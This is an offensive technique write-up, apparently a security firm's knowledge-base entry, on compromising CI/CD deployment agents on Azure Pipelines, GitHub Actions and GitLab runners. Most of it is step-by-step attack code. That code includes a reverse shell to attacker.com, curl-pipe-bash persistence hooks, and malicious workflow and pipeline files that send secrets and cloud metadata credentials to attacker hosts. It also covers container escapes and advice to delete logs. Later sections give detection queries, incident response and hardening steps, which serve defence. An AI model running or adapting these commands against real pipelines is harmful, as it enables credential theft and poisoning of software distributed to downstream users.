# [SUPPLY-CHAIN-006]: Deployment Agent Compromise

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | SUPPLY-CHAIN-006 |
| **MITRE ATT&CK v18.1** | [T1195.001 - Compromise Software Dependencies and Development Tools](https://attack.mitre.org/techniques/T1195/001/) |
| **Tactic** | Supply Chain Compromise |
| **Platforms** | Entra ID/DevOps |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | Azure Pipelines Agents 2.165+, GitHub-hosted runners (latest), GitLab Runners 13.0+, Jenkins agents (2.150+) |
| **Patched In** | Requires sandboxing and least-privilege container configurations |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Deployment agents are ephemeral or long-lived compute resources (self-hosted Azure Pipelines agents, GitHub Actions runners, GitLab Runners, Jenkins agents) that execute build and deployment jobs. These agents often run with elevated privileges and have access to deployment credentials (service principal credentials, API tokens, SSH keys, deployment certificates). By compromising an agent, an attacker gains complete control over the build pipeline, can steal credentials, modify artifacts, inject backdoors, and distribute poisoned software downstream to thousands of production systems.

**Attack Surface:** Self-hosted CI/CD agents running in cloud environments (Azure VMs, AWS EC2, Kubernetes), development networks, or on-premises infrastructure.

**Business Impact:** **Complete supply chain compromise and production system infiltration.** Once an agent is compromised, attackers have persistent access to build pipelines, can steal deployment credentials, inject malware into releases, and maintain backdoors across all systems that pull artifacts from the poisoned pipeline.

**Technical Context:** Deployment agent compromise typically remains undetected for weeks or months because agents are often treated as transient infrastructure. Attack execution takes minutes once agent access is gained.

### Operational Risk

- **Execution Risk:** Medium – Requires either network access to agent infrastructure or exploitation of agent software vulnerabilities
- **Stealth:** High – Malicious agent behavior often blends with legitimate build activity
- **Reversibility:** No – Artifacts already distributed; affected systems remain compromised until patched

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | v8.0 6.2 | Ensure that security vulnerabilities in OS and software are remediated |
| **DISA STIG** | GD000360 | CI/CD infrastructure must be hardened and monitored |
| **CISA SCuBA** | CM-5 | Access controls must be enforced on build agents |
| **NIST 800-53** | SI-7 | Software, firmware, and information integrity |
| **GDPR** | Art. 32 | Security of processing; infrastructure security |
| **DORA** | Art. 9 | Operational resilience; incident response for supply chain |
| **NIS2** | Art. 21 | Risk management and secure supply chain practices |
| **ISO 27001** | A.8.3.4 | Separation of development, test, and production |
| **ISO 27005** | Risk Scenario | Compromise of deployment infrastructure |

---

## 2. DEPLOYMENT AGENT ARCHITECTURE & VULNERABILITIES

### Common Agent Types and Attack Vectors

| Agent Type | Deployment Model | Common Vulnerabilities |
|---|---|---|
| **Azure Pipelines Agent** | Self-hosted (VM, Container, On-Prem) | Unpatched agent software, overprivileged service account, exposed credentials |
| **GitHub Runners** | GitHub-hosted (ephemeral) or Self-hosted | Workflow secrets exposed, runner process escape, access to checkout tokens |
| **GitLab Runners** | Docker, Kubernetes, Shell | Shared executor compromise, Kubernetes RBAC bypass, docker.sock binding |
| **Jenkins Agents** | VM, Docker, Kubernetes | Groovy script execution, remoting protocol exploits, shared workspace |

---

## 3. DETAILED EXECUTION METHODS

### METHOD 1: Compromise Self-Hosted Azure Pipelines Agent

**Supported Versions:** Azure Pipelines Agent 2.165+

#### Step 1: Identify Target Agent Infrastructure

**Objective:** Locate self-hosted agents and their network scope.

**Azure DevOps CLI Command:**

```bash
# List all agent pools and agents
az pipelines agent list --pool-id [POOL_ID] --organization "https://dev.azure.com/[org]" --project "[project]"

# Get detailed agent information
az pipelines agent show --agent-id [AGENT_ID] --pool-id [POOL_ID] \
  --organization "https://dev.azure.com/[org]" --project "[project]"
```

**What to Look For:**

- **Agent Status:** Online/Offline
- **Agent Version:** Outdated versions have known vulnerabilities
- **Machine Name:** Indicates infrastructure type (Azure VM, on-prem server, etc.)
- **Capabilities:** Lists installed tools (PowerShell, Node.js, Docker, etc.)

**Example Output:**

```json
{
  "id": 1,
  "name": "ubuntu-agent-1",
  "version": "2.170.0",
  "osDescription": "Linux 5.10.0-8-generic #1 SMP Debian 5.10.46-5 (2021-09-23)",
  "status": "online",
  "capabilities": {
    "Agent.OS": "Linux",
    "Agent.Version": "2.170.0",
    "Agent.ComputerName": "ubuntu-agent-1",
    "npm": "6.14.8",
    "docker": "20.10.8"
  }
}
```

#### Step 2: Exploit Known Agent Vulnerabilities or Network Access

**Objective:** Gain code execution on the agent.

**Option A: SSH/RDP Access to Agent VM**

If the agent runs on a publicly accessible VM:

```bash
# Discover agent VM via Azure Resource Graph
az graph query -q "Resources | where type =~ 'microsoft.compute/virtualmachines' | project name, id, tags" \
  | jq '.data[] | select(.tags.purpose == "ci-agent")'

# SSH into agent VM (if credentials are available)
ssh -i /path/to/private_key azureuser@agent-vm-ip

# Or RDP into Windows agent
xfreerdp /v:agent-vm-ip /u:domain\\user /p:password
```

**Option B: Exploit Agent Software Vulnerabilities**

Known vulnerabilities in older Azure Pipelines agents:

```bash
# Example: Deserialization vulnerability in agent protocol
# Exploit allows remote code execution via specially crafted agent job

# This requires knowledge of agent remoting protocol
# Azure Pipelines agents communicate with server via websocket + .NET remoting

curl -X POST http://agent-internal-ip:8080/malicious-payload \
  --data-binary @exploit.bin
```

**Option C: Container Escape (if Agent Runs in Docker)**

If the agent container is misconfigured:

```bash
# Inside compromised container, attempt to escape to host
docker run --rm -it -v /:/host -v /var/run/docker.sock:/var/run/docker.sock \
  --cap-add SYS_ADMIN \
  --security-opt apparmor=unconfined \
  ubuntu /bin/bash

# Once escaped, you have access to the host
whoami  # Should return root or elevated user
docker ps  # Access to host's docker daemon
```

#### Step 3: Access Agent Credentials and Secrets

**Objective:** Steal deployment credentials stored on or accessible to the agent.

**Locate Agent Configuration Directory:**

```bash
# On Linux
ls -la ~/.agent

# On Windows
dir "%USERPROFILE%\.agent"

# Agent credentials file
cat ~/.agent/.credentials  # Contains encrypted PAT token
cat ~/.agent/.runner  # Contains runner ID
```

**Extract Service Principal Credentials from Agent Environment:**

```bash
# During a pipeline job, the agent injects credentials into environment
# These are often available as environment variables

printenv | grep -i "AZURE\|SERVICE_PRINCIPAL\|DEPLOY"

# Example output:
# SYSTEM_TEAMFOUNDATIONCOLLECTIONURI=https://dev.azure.com/[org]/
# SYSTEM_ACCESSTOKEN=[Base64 Encoded PAT Token]
# ENDPOINT_AUTH_[SERVICENAME]={...}
```

**Decode and Use Stolen PAT Token:**

```bash
# SYSTEM_ACCESSTOKEN is the current build's PAT
export PAT=$SYSTEM_ACCESSTOKEN

# Use it to authenticate to Azure DevOps
curl -X GET \
  -H "Authorization: Basic $(echo -n ':$PAT' | base64)" \
  "https://dev.azure.com/[org]/_apis/projects?api-version=7.0"
```

#### Step 4: Inject Malicious Code into Build Artifacts

**Objective:** Modify compiled binaries or source before they're committed.

**Inject Backdoor into Build Output:**

```bash
# During build step, add malicious payload to artifact
cd /home/agent/_work/[project]/[project]

# Inject reverse shell into executable
echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1 #' >> build_output/app

# Or inject into compiled binary
objcopy --add-section .evil=payload.bin original.bin compromised.bin

# The compromised artifact is now part of the release
```

**Inject Environment Variables for Persistence:**

```bash
# Modify agent configuration to execute attacker code on every build
cat >> ~/.agent/.env << 'EOF'
export MALICIOUS_HOOK='curl http://attacker.com/check | bash'
eval $MALICIOUS_HOOK
EOF
```

#### Step 5: Exfiltrate Credentials and Artifacts

**Objective:** Extract all credentials and release packages for downstream poisoning.

**Steal All Available Credentials:**

```bash
# Export credentials from agent environment
env | grep -E "TOKEN|KEY|SECRET|PASSWORD|CREDENTIAL" > /tmp/creds.txt

# List all mounted secrets/credentials
mount | grep -i secret
ls -la /mnt/secrets-store/ 2>/dev/null || ls ~/.ssh/ 2>/dev/null

# Exfiltrate to attacker server
curl -X POST -d @/tmp/creds.txt http://attacker-webhook.com/collect_creds

# Or via data exfiltration service
base64 /tmp/creds.txt | curl -d @- http://attacker.com/exfil
```

**Identify and Steal Artifacts:**

```bash
# Locate published artifacts
ls -la ~/.agent/_work/

# Find binaries ready for release
find . -name "*.exe" -o -name "*.dll" -o -name "*.so" | head -20

# Copy artifacts to attacker-controlled storage
aws s3 cp build_output/ s3://attacker-bucket/artifacts/ --recursive

# Or via GitHub releases (if agent has GitHub credentials)
gh release create poisoned-v1.0 build_output/* --draft
```

**OpSec & Evasion:**

- Use legitimate tools (curl, wget, scp) for exfiltration
- Schedule exfiltration during off-hours to blend with normal build traffic
- Clear agent logs after compromise: `rm ~/.agent/logs/*`
- Delete evidence of unauthorized access

**References & Proofs:**

- [Microsoft Docs: Azure Pipelines Agent Security](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/agents?view=azure-devops&tabs=browser)
- [CyberArk: Security Analysis of Azure DevOps Job Execution](https://www.cyberark.com/resources/threat-research-blog/a-security-analysis-of-azure-devops-job-execution)
- [WithSecure: Attacking Azure Environments Through Azure DevOps](https://labs.withsecure.com/publications/performing-and-preventing-attacks-on-azure-cloud-environments-through-azure-devops)

### METHOD 2: Compromise GitHub Actions Self-Hosted Runner

**Supported Versions:** GitHub Actions (all runner versions)

#### Step 1: Identify GitHub Runner Configuration

**Objective:** Locate and enumerate self-hosted GitHub Actions runners.

**GitHub CLI Command:**

```bash
# List all self-hosted runners in organization
gh api repos/{owner}/{repo}/actions/runners --paginate

# For organization-wide runners
gh api orgs/{org}/actions/runners --paginate

# Get detailed runner information
gh api repos/{owner}/{repo}/actions/runners/[runner-id]
```

**Expected Output:**

```json
{
  "id": 123,
  "name": "ubuntu-runner-1",
  "os": "linux",
  "status": "online",
  "labels": ["self-hosted", "linux", "docker"],
  "busy": true
}
```

#### Step 2: Gain Access to Runner Machine

**Objective:** Execute code on the runner.

**Option A: Direct SSH Access**

```bash
# If runner is exposed via SSH
ssh -i runner-key.pem runner@runner-machine-ip

# Navigate to runner work directory
cd /home/runner/actions-runner/
./run.sh --once  # Run once to execute malicious job
```

**Option B: Exploit Runner Software Vulnerabilities**

GitHub Actions runners are Node.js-based; known vulnerabilities exist:

```bash
# Example: Bypass runner token validation
# This requires detailed knowledge of GitHub Actions runner protocol

# Alternative: Inject into runner startup scripts
cat >> ~/.profile << 'EOF'
# Attacker code - executed on every runner job
export GH_TOKEN=$(echo ${{ secrets.GITHUB_TOKEN }} | base64)
curl -X POST http://attacker.com/log_token -d "token=$GH_TOKEN"
EOF
```

#### Step 3: Steal GitHub Secrets and Tokens

**Objective:** Extract secrets stored in GitHub Actions.

**During Workflow Execution:**

GitHub automatically injects secrets into environment variables during job execution:

```bash
# Inside a workflow job (as attacker who modified the workflow)
- name: Exfiltrate Secrets
  run: |
    env | grep -E "GITHUB_|DEPLOY_" > /tmp/secrets.txt
    
    # Extract specific secrets
    echo "GitHub Token: ${{ github.token }}" >> /tmp/secrets.txt
    echo "Deployed Secrets: ${{ secrets.DEPLOY_KEY }}" >> /tmp/secrets.txt
    
    # Exfiltrate
    curl -X POST -d @/tmp/secrets.txt http://attacker.com/webhook
```

**Extract from Runner's Credential Store:**

```bash
# On Linux runner
ls -la ~/.local/share/actions-runner/

# Look for cached credentials
grep -r "GITHUB_TOKEN" ~/.bash_history ~/.ssh/authorized_keys 2>/dev/null

# Extract GitHub App tokens (if runner uses app-based auth)
cat ~/.github/app_token
```

#### Step 4: Modify Workflow or Inject Jobs

**Objective:** Inject malicious steps into every workflow run.

**Method: Commit Malicious Workflow to Repository**

```bash
# Create malicious workflow
cat > .github/workflows/exfil.yml << 'EOF'
name: Exfiltrate

on: [push, pull_request, schedule]

jobs:
  steal:
    runs-on: [self-hosted, linux]
    steps:
      - name: Get Runner Secrets
        run: |
          env | base64 | curl -X POST -d @- http://attacker.com/exfil
          
          # If using AWS, steal instance metadata
          curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ \
            | xargs -I {} curl http://169.254.169.254/latest/meta-data/iam/security-credentials/{} \
            | curl -X POST -d @- http://attacker.com/aws_creds
EOF

git add .github/workflows/exfil.yml
git commit -m "Add CI improvements"
git push
```

#### Step 5: Distribute Poisoned Artifacts

**Objective:** Inject backdoors into release artifacts.

**Modify Build Output Before Release:**

```bash
# During build workflow step
- name: Build
  run: |
    npm run build
    
    # Inject backdoor
    echo 'eval(atob("..."))' >> dist/bundle.js
    
- name: Release
  run: |
    # Release includes backdoor
    npm publish dist/
```

**References & Proofs:**

- [GitHub Docs: Security Hardening – Workflows](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [GitHub Security Lab: GitHub Actions Security Advisories](https://securitylab.github.com/)

### METHOD 3: Kubernetes-Based GitLab Runner Container Escape

**Supported Versions:** GitLab Runners 13.0+ with Kubernetes executor

#### Step 1: Compromise GitLab Runner Pod

**Objective:** Gain initial code execution within a runner pod.

**Identify GitLab Runner Pods:**

```bash
# List GitLab runners in Kubernetes cluster
kubectl get pods -n gitlab-runner -o wide

# Get runner configuration
kubectl describe pod gitlab-runner-xyz -n gitlab-runner

# Check runner capabilities (privileged, volume mounts, etc.)
kubectl get pod gitlab-runner-xyz -n gitlab-runner -o yaml | grep -A5 "securityContext\|volumeMounts"
```

#### Step 2: Exploit Runner Misconfiguration for Privilege Escalation

**Objective:** Escape container to reach host or other pods.

**Option A: Shared Volume Attack**

If runner pod mounts shared volumes:

```bash
# Inside runner pod, write malicious script to shared volume
cat > /mnt/shared/malicious.sh << 'EOF'
#!/bin/bash
# This script runs with host privileges if mounted as hostPath
whoami  # Should be root or high-privilege user
cat /root/.ssh/id_rsa > /tmp/exfil.txt
EOF

chmod +x /mnt/shared/malicious.sh

# Wait for host process to execute the script
```

**Option B: Docker Socket Binding**

If `/var/run/docker.sock` is mounted:

```bash
# Inside runner pod, access host's Docker daemon
docker ps  # List all containers on host

# Pull and run privileged container
docker run --rm -v /:/host -v /var/run/docker.sock:/var/run/docker.sock \
  --privileged \
  ubuntu /bin/bash

# Now on host with full access
chroot /host /bin/bash
```

#### Step 3: Access Kubernetes API and Cluster Secrets

**Objective:** Extract cluster credentials for lateral movement.

**Query Kubernetes API from Runner Pod:**

```bash
# Check service account token
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Query API for secrets
APISERVER=https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT
SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
TOKEN=$(cat $SERVICEACCOUNT/token)

# List all secrets in cluster
curl --header "Authorization: Bearer $TOKEN" \
  --cacert $SERVICEACCOUNT/ca.crt \
  $APISERVER/api/v1/namespaces/default/secrets | jq '.items[].data'
```

#### Step 4: Inject into CI/CD Pipeline Jobs

**Objective:** Modify pipelines to exfiltrate secrets on every job execution.

**Modify `.gitlab-ci.yml` in Repository:**

```yaml
variables:
  MALICIOUS_VAR: |
    env | grep -E "DEPLOY|TOKEN|KEY" | base64 | curl -X POST -d @- http://attacker.com/exfil

before_script:
  - eval $MALICIOUS_VAR
  
stages:
  - build
  - deploy

build:
  stage: build
  script:
    - npm run build
```

#### Step 5: Maintain Persistence in Runner

**Objective:** Ensure backdoor survives runner restart.

**Inject into Runner Initialization Script:**

```bash
# Get access to GitLab Runner configuration
kubectl exec -it gitlab-runner-xyz -n gitlab-runner -- bash

# Modify runner startup
cat >> /scripts/entrypoint.sh << 'EOF'
# Persistence hook
nohup bash -c 'while true; do curl http://attacker.com/check | bash; sleep 300; done' > /tmp/runner.log 2>&1 &
EOF

# Restart runner
kubectl rollout restart deployment gitlab-runner -n gitlab-runner
```

**References & Proofs:**

- [GitLab Docs: Kubernetes Runner Security](https://docs.gitlab.com/runner/executors/kubernetes.html)
- [Kubernetes Security: Service Account Token Usage](https://kubernetes.io/docs/reference/access-authn-authz/service-accounts-admin/)

---

## 4. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Agent Process Anomalies:**
  - Unusual child processes spawned from agent worker (curl, wget, nc, ssh)
  - Agent process consuming abnormal CPU/memory
  - Outbound connections to non-whitelisted IPs/domains

- **Credential Access:**
  - Environment variable enumeration (`env | grep TOKEN`)
  - Access to `.agent` configuration directory or `~/.ssh/`
  - Reading from `/var/run/secrets/kubernetes.io/serviceaccount/` (Kubernetes runners)

- **Artifact Tampering:**
  - Binary modifications detected in compiled artifacts
  - Unexpected files in artifact packages
  - Hash mismatches in signed binaries

- **Log Artifacts:**
  - Pipeline logs showing unusual commands in build steps
  - Agent logs with credential references or curl/wget invocations
  - Kubernetes audit logs showing privilege escalation attempts

### Forensic Artifacts

- **Agent Configuration:** `~/.agent/` directory (Linux) or `%USERPROFILE%\.agent\` (Windows)
- **Build Artifacts:** Located in agent work directory (`~/.agent/_work/[project]/`)
- **Logs:** Agent logs in `~/.agent/_diag/` or pipeline execution logs in CI/CD UI
- **Container Images:** If runner is containerized, inspect image layers for injected code
- **Kubernetes Events:** `kubectl describe node` shows container events, pod exec records

### Response Procedures

1. **Isolate:**

   ```bash
   # Immediately disable the compromised agent
   az pipelines agent disable --agent-id [AGENT_ID] --pool-id [POOL_ID] \
     --organization "https://dev.azure.com/[org]" --project "[project]"
   
   # Stop all running jobs on agent
   az pipelines agent update --agent-id [AGENT_ID] --user-capabilities "disabled=true"
   
   # For Kubernetes runners
   kubectl delete pod gitlab-runner-xyz -n gitlab-runner
   ```

2. **Collect Evidence:**

   ```bash
   # Export agent logs
   az pipelines agent log list --agent-id [AGENT_ID] --pool-id [POOL_ID] > /tmp/agent_logs.txt
   
   # Capture process memory from agent machine
   ssh agent-user@agent-ip "sudo dd if=/proc/[agent-pid]/cmdline of=/tmp/cmdline.dump"
   scp agent-user@agent-ip:/tmp/cmdline.dump /tmp/
   
   # Export all artifacts that passed through the agent
   find ~/.agent/_work -name "*" -type f | xargs -I {} sha256sum {} > /tmp/artifact_hashes.txt
   ```

3. **Remediate:**

   ```bash
   # Rotate all service principal credentials used by agent
   az ad sp credential delete --id [SERVICE_PRINCIPAL_ID]
   az ad sp credential create --id [SERVICE_PRINCIPAL_ID] \
     --display-name "Rotated after compromise" \
     --end-date 2027-01-10
   
   # Rebuild agent from clean image
   # Do NOT use existing agent VM - provision new VM from baseline image
   az vm create --resource-group [RG] --name agent-new-1 \
     --image [clean-baseline-image]
   
   # Re-register agent
   ssh agent-user@agent-new-ip
   cd /opt/hostedagenttools
   ./config.sh --url "https://dev.azure.com/[org]/[project]" \
     --auth pat --token $PAT
   ```

   **For Kubernetes Runners:**

   ```bash
   # Delete compromised pod
   kubectl delete pod gitlab-runner-xyz -n gitlab-runner --force --grace-period=0
   
   # Verify new pod is spawned with clean state
   kubectl wait --for=condition=Ready pod -l app=gitlab-runner -n gitlab-runner --timeout=300s
   ```

---

## 5. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

- **Isolate Agent Network:** Deploy agents in restricted network segments with egress filtering. Agents should only access CI/CD platform, artifact repositories, and deployment targets.

  **Manual Steps (Azure):**
  
  1. Create **Network Security Group (NSG)** for agent VMs
  2. Allow inbound: Only from Azure DevOps IP ranges (from [Microsoft documentation](https://learn.microsoft.com/en-us/azure/devops/server/admin/safe-host-addresses?view=azure-devops-2019))
  3. Allow outbound: 
     - HTTPS 443 to Azure DevOps service
     - HTTP/HTTPS to artifact repositories only
     - Block all other egress (no general internet access)
  4. Apply NSG to agent subnet
  
  **PowerShell:**

  ```powershell
  # Create NSG
  $nsg = New-AzNetworkSecurityGroup -ResourceGroupName "CI-RG" -Name "agent-nsg" -Location "eastus"
  
  # Add rule: Deny all outbound except approved
  Add-AzNetworkSecurityRuleConfig -NetworkSecurityGroup $nsg `
    -Name "DenyAllOutbound" `
    -Priority 100 `
    -Direction Outbound `
    -Access Deny `
    -Protocol '*' `
    -SourcePortRange '*' `
    -DestinationPortRange '*' `
    -DestinationAddressPrefix '*'
  
  # Add rule: Allow outbound to Azure DevOps only
  Add-AzNetworkSecurityRuleConfig -NetworkSecurityGroup $nsg `
    -Name "AllowAzureDevOpsOutbound" `
    -Priority 200 `
    -Direction Outbound `
    -Access Allow `
    -Protocol 'Https' `
    -SourcePortRange '*' `
    -DestinationPortRange '443' `
    -DestinationAddressPrefix '13.107.0.0/16'  # Azure DevOps IP range
  ```

- **Eliminate Stored Credentials on Agents:** Use managed identity, workload identity, or short-lived tokens instead of persistent credentials.

  **Manual Steps (Azure Pipelines with Managed Identity):**
  
  1. Create **User-Assigned Managed Identity**
  2. Grant identity `Contributor` role on target subscription
  3. In agent VM, assign the managed identity
  4. In pipeline, use managed identity for Azure Resource Manager service connection:
  
     ```yaml
     trigger:
       - main
     
     pool:
       vmImage: 'ubuntu-latest'
       name: 'ManagedIdentityPool'
     
     steps:
       - task: AzureCLI@2
         displayName: 'Deploy with Managed Identity'
         inputs:
           azureSubscription: 'ManagedIdentity-ServiceConnection'
           scriptType: 'bash'
           scriptLocation: 'inlineScript'
           inlineScript: 'az deployment group create --name deploy --resource-group myRG --template-file template.json'
     ```

- **Use Ephemeral Agents / Containerized Runners:** Minimize agent lifetime to reduce window for compromise. Use cloud-hosted runners (GitHub Actions, Azure DevOps hosted agents) instead of long-lived self-hosted infrastructure.

  **Switch to GitHub Hosted Runners:**

  ```yaml
  # Instead of self-hosted
  # runs-on: [self-hosted, ubuntu-20.04]
  
  # Use GitHub-hosted
  runs-on: ubuntu-latest
  ```

- **Disable Script Execution in Build Artifacts:** Prevent accidental execution of user-provided scripts during builds.

  **Manual Steps (Azure Pipelines):**
  
  1. Go to **Project Settings** → **Pipelines** → **Settings**
  2. Disable: **Make secrets available to builds of forks**
  3. Disable: **Make secrets available to builds of pull requests from the same repository**
  4. Require **Approval on all pull requests** before builds execute

### Priority 2: HIGH

- **Implement Agent Image Baseline & Immutability:** Use immutable agent images (VM images, container images) with fixed versions. Rebuild agents from baseline after every use.

  **Azure Image Builder Baseline:**

  ```json
  {
    "type": "Microsoft.VirtualMachineImages/imageTemplates",
    "name": "agent-baseline",
    "properties": {
      "source": {
        "type": "PlatformImage",
        "publisher": "Canonical",
        "offer": "UbuntuServer",
        "sku": "18_04-lts-gen2",
        "version": "latest"
      },
      "customize": [
        {
          "type": "Shell",
          "inline": [
            "apt-get update",
            "apt-get install -y azure-pipelines-agent",
            "# Remove any temporary files and logs"
          ]
        }
      ],
      "distribute": [
        {
          "type": "ManagedImage",
          "imageId": "/subscriptions/.../resourceGroups/.../providers/Microsoft.Compute/images/agent-baseline-v1"
        }
      ]
    }
  }
  ```

- **Monitor Agent Process and Network Activity:** Detect unauthorized child processes, outbound connections, or credential access.

  **Azure Monitor / Defender for Cloud Detection:**
  
  1. Enable **Defender for Servers** on agent VMs
  2. Configure **Behavioral detection** for:
     - Unexpected process spawning from agent worker
     - Outbound connections to unknown IPs
     - File modifications in build directories
  
  **KQL Query (Microsoft Sentinel):**

  ```kusto
  DeviceProcessEvents
  | where ParentProcessName contains "Agent.Worker"
  | where ProcessName in ("curl", "wget", "nc", "ssh", "base64", "openssl")
  | project TimeGenerated, DeviceName, ProcessName, CommandLine
  ```

- **Enforce Artifact Signing and Verification:** Require all release artifacts to be cryptographically signed. Verify signatures before deployment.

  **Manual Steps (Azure DevOps):**
  
  1. Generate code signing certificate
  2. In build pipeline, sign artifacts:
  
     ```yaml
     - task: PublishBuildArtifacts@1
       inputs:
         pathToPublish: '$(Build.ArtifactStagingDirectory)'
         publishLocation: 'Container'
     
     - script: |
         for artifact in $(Build.ArtifactStagingDirectory)/*; do
           signtool sign /f certificate.pfx /p password "$artifact"
         done
     ```
  
  3. In deployment pipeline, verify signature:
  
     ```yaml
     - script: |
         signtool verify /pa $(System.ArtifactsDirectory)/*.exe
     ```

### Access Control & Policy Hardening

- **RBAC on Agent Pools:** Restrict who can queue builds and modify agents.

  **Manual Steps (Azure DevOps):**
  
  1. Go to **Project Settings** → **Agent Pools**
  2. Select pool → **Security**
  3. Remove `Contribute to pull requests` from **Contributors**
  4. Assign to **Release Managers** only

- **Conditional Access for Service Principals:** Require multi-factor authentication or IP whitelisting for service principals used by agents.

  **Manual Steps (Azure Entra ID):**
  
  1. Go to **Azure Portal** → **Entra ID** → **Conditional Access**
  2. Create policy: **Service Principal Access Control**
  3. Assignments:
     - **Users or workload identities:** Select agent service principals
     - **Cloud apps or actions:** Azure DevOps
  4. **Access controls:**
     - Require: **Compliant device** or **IP whitelist**
  5. Enable and click **Create**

### Validation Command (Verify Fix)

```bash
# Verify agent is in restricted network
ping -c 1 8.8.8.8  # Should FAIL

# Verify agent has no persistent credentials
ls ~/.ssh/ ~/.aws ~/.azure 2>/dev/null | wc -l  # Should return 0

# Verify agent image version is current
az pipelines agent show --agent-id [AGENT_ID] | jq '.version'  # Should be latest

# Verify outbound only to approved endpoints
netstat -an | grep ESTABLISHED | grep -v "dev.azure.com\|artifacts.azureedge.net"  # Should be empty
```

---

## 6. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Supply Chain Compromise** | [SUPPLY-CHAIN-005] Pipeline Variable Injection | Attacker gains initial agent access |
| **2** | **Current Step** | **[SUPPLY-CHAIN-006]** | **Attacker compromises deployment agent** |
| **3** | **Lateral Movement** | [SUPPLY-CHAIN-007] Container Registry Poisoning | Attacker injects backdoors into container images |
| **4** | **Supply Chain Impact** | [SUPPLY-CHAIN-008] Helm Chart Poisoning | Poisoned Kubernetes deployments |
| **5** | **Impact** | [IMPACT-RANSOM-001] Production System Compromise | Malware deployed to production via poisoned releases |

---

## 7. REAL-WORLD EXAMPLES

### Example 1: GitHub Actions Runner Supply Chain Attack (2021-2023)

- **Target:** Open-source projects using self-hosted GitHub Actions runners
- **Timeline:** Ongoing
- **Technique Status:** ACTIVE
- **Attack Method:** Attackers compromised self-hosted GitHub Actions runners through misconfigured workflows. Once runner compromise achieved, attackers stole GitHub tokens and secrets embedded in workflows, then modified release artifacts to include backdoors.
- **Impact:** Thousands of projects affected; supply chain poisoning
- **Reference:** [GitHub Security Lab Case Studies](https://securitylab.github.com/)

### Example 2: GitLab Runner Kubernetes Privilege Escalation (2021)

- **Target:** Enterprises running GitLab with Kubernetes-based runners
- **Timeline:** Vulnerability disclosed 2021
- **Technique Status:** ACTIVE (if not patched)
- **Attack Method:** Misconfigured GitLab Runners in Kubernetes with access to Docker socket allowed container escape. Attackers compromised runners and accessed host Kubernetes API, then extracted secrets from etcd.
- **Impact:** Complete cluster compromise; lateral movement to other organizations' runners
- **Reference:** [GitLab Security Advisories](https://about.gitlab.com/security/)

### Example 3: Azure Pipelines Agent Credential Theft (2022)

- **Target:** Enterprise Azure DevOps deployments
- **Timeline:** 2022
- **Technique Status:** ACTIVE
- **Attack Method:** Attackers gained access to Azure Pipelines agents through phishing or initial compromise. From agents, they exfiltrated service principal credentials stored in agent configuration. These credentials were then used to access Azure subscriptions and deploy ransomware.
- **Impact:** Multi-million dollar ransomware attack; persistent access maintained for months
- **Reference:** [WithSecure: Azure DevOps Supply Chain Attacks](https://labs.withsecure.com/publications/performing-and-preventing-attacks-on-azure-cloud-environments-through-azure-devops)

---